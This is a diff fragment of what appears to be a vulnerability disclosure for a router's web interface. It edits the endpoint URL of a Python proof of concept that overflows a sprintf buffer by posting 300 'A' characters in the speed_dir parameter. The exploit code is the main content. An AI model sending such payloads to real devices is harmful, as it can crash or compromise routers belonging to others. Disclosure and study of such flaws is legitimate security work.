@@ -25,7 +25,7 @@ get value from speed_dir, then call sprintf, cause buff overflow
 
 ## POC
 ```
-url = "http://192.168.1.13/goform/formSetSpeedWan"
+url = "http://192.168.1.13/goform/SetSpeedWan"
 payload = 'A'*300 + '\n'
 
 r = requests.post(url, data={'speed_dir': payload})
